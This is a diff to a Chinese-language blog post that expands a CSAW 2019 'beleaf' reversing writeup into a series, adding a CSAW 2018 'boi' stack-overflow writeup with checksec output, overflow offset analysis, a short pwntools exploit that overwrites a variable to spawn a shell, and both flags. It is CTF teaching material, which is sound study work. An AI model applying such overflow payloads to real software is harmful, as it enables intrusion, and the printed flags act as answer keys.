@@ -1,10 +1,10 @@
 ---
-title: 'Writeup: CSAW 2019 beleaf'
+title: 'Writeups: Nightmare Series'
 date: '2024-07-24'
-lastmod: '2024-07-24'
-tags: ['CTF','Writeup', 'Reverse']
+lastmod: '2024-07-25'
+tags: ['CTF','Writeup', 'Pwn', 'Nightmare']
 draft: false
-summary: 'Writeup for CSAW 2019 beleaf'
+summary: 'Writeups for Nightmare Series'
 authors: ['default']
 ---
 
@@ -12,18 +12,20 @@ authors: ['default']
   <TOCInline toc={props.toc} asDisclosure />
 </div>
 
-## Information
+## CSAW 2019 beleaf
+
+### Information
 
  - Category: Reverse
  - Points: 50
 
-## Description
+### Description
 
 > tree sounds are best listened to by https://binary.ninja/demo or ghidra
 
 <Download name="beleaf" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/03-beginner_re/csaw19_beleaf/beleaf" type="Binary" />
 
-## Writeup
+### Writeup
 
 简单运行一下程序：
 
@@ -32,6 +34,13 @@ authors: ['default']
 Enter the flag
 >>> i dont have the fucking flag
 Incorrect!
+```
+
+一些基本信息：
+
+```plain-text
+λ ~/ file beleaf
+beleaf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6d305eed7c9bebbaa60b67403a6c6f2b36de3ca4, stripped
 ```
 
 大概可以推测出我们的目标就是弄到一个正确的 `flag`。
@@ -61,7 +70,7 @@ Incorrect!
  - `flag` 长度 >= 33
  - `calc_idx(input[i]) == valid_arr[i]`
 
-## Exploit
+### Exploit
 
 ```python
 #!/usr/bin/python3
@@ -125,7 +134,77 @@ if __name__ == '__main__':
     main()
 ```
 
-## Flag
+### Flag
 
 Flag: `flag{we_beleaf_in_your_re_future}`
+
+## CSAW 2018 Quals Boi
+
+### Information
+
+ - Category: Pwn
+ - Points: 25
+
+### Description
+
+> Only big boi pwners will get this one!
+
+<Download name="boi" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/csaw18_boi/boi" type="Binary" />
+
+### Writeup
+
+```plain-text
+λ ~/ file boi
+boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
+λ ~/ pwn checksec boi
+[*] '/home/cub3y0nd/Projects/CTF/boi'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+试运行一下，发现它只是输出系统时间：
+
+```plain-text
+λ ~/ ./boi
+Are you a big boiiiii??
+aaaa
+Thu Jul 25 05:35:00 PM CST 2024
+```
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/25/pkbJ5H1.png" width={1920} height={1080} />
+</center>
+
+从 IDA 里面可以看出，程序可以将一个 24 (0x18) 字节 数据读入 `buf` 中。如果 `v5` 的高双字等于 `0xCAF3BAEE` 则返回 shell，否则返回系统时间。
+
+所以我们的思路就是溢出，然后覆盖原始数据。
+
+下面是两种得到溢出点的方法：
+
+1. 由于 `buf` 只有 16 字节大小（2 * __int64），而 `read` 却可以读取 24 字节数据，所以这里存在溢出问题，可以覆盖变量 `v5` 的内容。所以 payload 可以是 16（填满 buf） + 4（填满 4 字节低位使后面的数据可以直接覆盖高位数据，也就是做判断的部分） 字节垃圾数据 + `0xCAF3BAEE`。
+2. 通过调试知道溢出点是 20 (0x14)：
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/25/pkbYnU0.png" width={1920} height={1080} />
+</center>
+
+### Exploit
+
+```python
+from pwn import *
+
+target = process('./boi')
+
+payload = b'A' * 0x14 + p32(0xcaf3baee)
+
+target.send(payload)
+target.interactive()
+```
+
+### Flag
+
+Flag: `flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}`
 
